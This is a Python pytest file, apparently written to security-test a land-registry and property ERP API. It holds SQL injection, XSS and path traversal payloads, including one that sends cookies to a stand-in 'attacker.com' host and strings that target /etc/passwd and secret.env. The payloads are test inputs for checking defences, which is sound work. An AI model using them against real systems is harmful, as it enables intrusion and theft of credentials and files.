"""
Advanced Security Red-Teaming & Penetration Testing Suite
Validates enterprise resilience against OWASP Top 10 vulnerabilities,
injection flaws, XSS polyglots, IDOR privilege escalation, path traversal,
cryptographic tampering, and statutory bypass attempts.
"""

import json
import urllib.request
import urllib.error
import pytest
from src.security.security_guard import security_guard, SecurityGuard
from src.erp.dlap_registry_engine import DLAPRegistryEngine
from contracts.conveyancer import LegalGatekeeper
from spatial.zoning_validator import ZoningValidator
from shapely.geometry import Point, Polygon

BASE_URL = "http://127.0.0.1:8000"


# ==============================================================================
# 1. SQL & PostGIS Injection Resistance (OWASP A03 / CWE-89)
# ==============================================================================

@pytest.mark.parametrize("payload", [
    "' OR '1'='1",
    "'; DROP TABLE deeds; --",
    "' UNION SELECT null, null, null, null --",
    "admin' --",
    "1' OR pg_sleep(5) --",
    "STAND-001' OR 'x'='x",
])
def test_penetration_sql_injection_neutralization(payload):
    """Verifies that malicious SQL injection strings are safely handled and sanitized."""
    sanitized = SecurityGuard.sanitize(payload)
    # Verification that raw SQL metas are disarmed and queries are treated as literals
    assert isinstance(sanitized, str)
    
    # Test through DLAP Deed API endpoint
    req_body = json.dumps({"deed_number": payload}).encode("utf-8")
    req = urllib.request.Request(
        f"{BASE_URL}/api/dlap/verify",
        data=req_body,
        headers={"Content-Type": "application/json", "X-User-Role": "dlap"}
    )
    with urllib.request.urlopen(req) as resp:
        assert resp.status == 200
        data = json.loads(resp.read().decode())
        # Malicious payload must result in unverified/rejected, NEVER leak internal records
        assert data["can_transfer_or_finance"] is False
        assert "rejection_reason" in data or data.get("status") in ("UNREGISTERED", None)


# ==============================================================================
# 2. Advanced Cross-Site Scripting (XSS) & Polyglots (OWASP A03 / CWE-79)
# ==============================================================================

@pytest.mark.parametrize("xss_payload", [
    "<script>alert('pwned')</script>",
    "<img src=x onerror=alert(document.cookie)>",
    "<svg/onload=fetch('http://attacker.com?c='+document.cookie)>",
    "javascript:/*--></title></style></textarea></script><svg/onload=alert(1)>",
    "<iframe src=\"javascript:alert(1)\"></iframe>",
    "<a href=\"javascript:void(0)\" onclick=\"evil()\">Click</a>",
])
def test_penetration_xss_polyglots_neutralization(xss_payload):
    """Ensures XSS polyglots cannot inject executable tags or javascript schemes."""
    sanitized = SecurityGuard.sanitize(xss_payload)
    assert "<script>" not in sanitized
    assert "</script>" not in sanitized
    assert "<svg" not in sanitized or "&lt;svg" in sanitized
    assert "<img" not in sanitized or "&lt;img" in sanitized
    assert "<iframe" not in sanitized or "&lt;iframe" in sanitized
    assert "javascript:" not in sanitized

    # Test reflection through API endpoint
    req_body = json.dumps({
        "full_name": xss_payload,
        "income_usd": 12000.0,
        "rent_usd": 2000.0
    }).encode("utf-8")
    req = urllib.request.Request(
        f"{BASE_URL}/api/tenant/screen",
        data=req_body,
        headers={"Content-Type": "application/json", "X-User-Role": "leasecrm"}
    )
    with urllib.request.urlopen(req) as resp:
        assert resp.status == 200
        data = json.loads(resp.read().decode())
        # The stored and reflected name must be safe
        assert "<script>" not in data["full_name"]
        assert "javascript:" not in data["full_name"]


# ==============================================================================
# 3. Path Traversal & Arbitrary File Access (OWASP A01 / CWE-22)
# ==============================================================================

@pytest.mark.parametrize("traversal_path", [
    "/../../../../etc/passwd",
    "/..\\..\\..\\Windows\\win.ini",
    "/static/../../package.json",
    "/api/../../../secret.env",
    "/%2e%2e%2f%2e%2e%2fpackage.json",
])
def test_penetration_path_traversal_blocked(traversal_path):
    """Verifies that arbitrary directory escape attempts are blocked with HTTP 403."""
    req = urllib.request.Request(f"{BASE_URL}{traversal_path}")
    try:
        with urllib.request.urlopen(req) as resp:
            # If server handled it via static handler, it must not succeed in reading sensitive files
            assert resp.status in (403, 404)
    except urllib.error.HTTPError as exc:
        assert exc.code in (403, 404)
        if exc.code == 403:
            err_data = json.loads(exc.read().decode())
            assert "security_status" in err_data


# ==============================================================================
# 4. Cryptographic HMAC Signature Tamper Resistance (OWASP A02 / CWE-345)
# ==============================================================================

def test_penetration_tampered_hmac_signature_detection():
    """Confirms that modifying any transaction property invalidates the HMAC signature."""
    payload = {
        "rec": "REC-2026-9999",
        "stand": "STAND-HARARE-4091",
        "usd": 7500.0
    }
    signature = SecurityGuard.sign_transaction(payload)
    assert SecurityGuard.verify_transaction_signature(payload, signature) is True

    # 1. Fraudulent modification: Altering amount
    fraud_payload_amount = payload.copy()
    fraud_payload_amount["usd"] = 750.0
    assert SecurityGuard.verify_transaction_signature(fraud_payload_amount, signature) is False

    # 2. Fraudulent modification: Altering stand target
    fraud_payload_stand = payload.copy()
    fraud_payload_stand["stand"] = "STAND-HARARE-0001"
    assert SecurityGuard.verify_transaction_signature(fraud_payload_stand, signature) is False

    # 3. Forged signature: Altered hash byte
    forged_sig = signature[:-4] + "ffff"
    assert SecurityGuard.verify_transaction_signature(payload, forged_sig) is False


# ==============================================================================
# 5. Insecure Direct Object Reference (IDOR) & RBAC Hardening (OWASP A01 / CWE-284)
# ==============================================================================

@pytest.mark.parametrize("role, endpoint, method", [
    ("buyer", "/api/financials", "GET"),
    ("buyer", "/api/security/audit", "GET"),
    ("buyer", "/api/security/verify_ledger", "GET"),
    ("buyer", "/api/hr/employees", "GET"),
    ("buyer", "/api/fleet/summary", "GET"),
    ("buyer", "/api/dlap/caveat", "POST"),
    ("sales", "/api/financials", "GET"),
    ("sales", "/api/security/audit", "GET"),
    ("builder", "/api/financials", "GET"),
    ("inventory", "/api/hr/payroll/process", "POST"),
    ("fieldservice", "/api/dlap/caveat", "POST"),
])
def test_penetration_idor_and_unauthorized_endpoints(role, endpoint, method):
    """Enforces zero-trust RBAC on administrative and sensitive endpoints."""
    data = json.dumps({"action": "REGISTER", "deed_number": "TD-001"}).encode("utf-8") if method == "POST" else None
    headers = {"X-User-Role": role}
    if method == "POST":
        headers["Content-Type"] = "application/json"
    req = urllib.request.Request(
        f"{BASE_URL}{endpoint}",
        data=data,
        headers=headers
    )
    with pytest.raises(urllib.error.HTTPError) as exc_info:
        urllib.request.urlopen(req)
    assert exc_info.value.code == 403
    err_body = json.loads(exc_info.value.read().decode())
    assert err_body["security_status"] == "BLOCKED_BY_RBAC_POLICY"


# ==============================================================================
# 6. Denial-of-Service Velocity Throttling (OWASP A04 / Rate Limiting)
# ==============================================================================

def test_penetration_rate_limiter_velocity_throttle():
    """Verifies client request velocity threshold prevents API brute-force and DoS floods."""
    attacker_ip = "203.0.113.88"
    limit = 50
    # First 50 requests are permitted
    for _ in range(limit):
        allowed = security_guard.check_rate_limit(attacker_ip, limit=limit, window_seconds=60)
        assert allowed is True

    # 51st request exceeds threshold and is immediately throttled
    throttled = security_guard.check_rate_limit(attacker_ip, limit=limit, window_seconds=60)
    assert throttled is False


# ==============================================================================
# 7. Statutory Regulatory Gatekeeping (Deeds Office, EMA Wetlands, ZNHSP 40%)
# ==============================================================================

def test_penetration_statutory_wetland_encroachment_rejection():
    """Prevents boundary encroachers from passing environmental screening."""
    validator = ZoningValidator(wetland_buffer_distance_m=100.0)
    # Wetland located at (500, 500)
    wetland = Point(500, 500)

    # Malicious attempt: Parcel encroaching at 30m distance (violating 100m buffer)
    encroaching_parcel = Polygon([(510, 510), (540, 510), (540, 540), (510, 540)])
    result = validator.validate_wetland_buffer(encroaching_parcel, [wetland])
    assert result["compliant"] is False
    assert result["status"] == "REJECTED_WETLAND_ENCROACHMENT"
    assert len(result["violations"]) > 0


def test_penetration_statutory_high_rise_densification_mandate():
    """Enforces ZNHSP 40% high-rise land quota."""
    validator = ZoningValidator(high_rise_min_ratio=0.40)
    # Attempting to allocate only 25% (below 40% statutory threshold)
    result = validator.validate_densification_quota(high_rise_area_m2=25000.0, total_residential_area_m2=100000.0)
    assert result["compliant"] is False
    assert result["status"] == "REJECTED_BELOW_DENSIFICATION_MANDATE"


def test_penetration_statutory_title_deed_caveat_and_debt_lock():
    """Enforces conveyancing gatekeeper against active caveats or outstanding balances."""
    gatekeeper = LegalGatekeeper()

    # Attempt 1: Title release with outstanding debt ($100 unpaid)
    blocked_debt = gatekeeper.verify_title_eligibility(
        zoning_clearance={"wetland_compliant": True},
        spatial_clearance={"certified": True},
        financial_status={"is_fully_paid": False},
        cession_approved=True
    )
    assert blocked_debt["action"] == "BLOCK_DEED_RELEASE"
    assert blocked_debt["status"] == "INJUNCTION_ENFORCED"
    assert any("outstanding balance" in r.lower() for r in blocked_debt["reasons"])

    # Attempt 2: DLAP Caveat Lock
    dlap = DLAPRegistryEngine()
    deed_no = "TD-4982/2021"
    deed = dlap.registry[deed_no]
    cav_id = deed.register_electronic_caveat("High Court Sheriff", "Judicial Attachment Freeze")
    
    check_caveat = dlap.verify_title_for_transfer(deed_no)
    assert check_caveat["can_transfer_or_finance"] is False
    assert check_caveat["status"] == "ELECTRONIC CAVEAT ACTIVE"
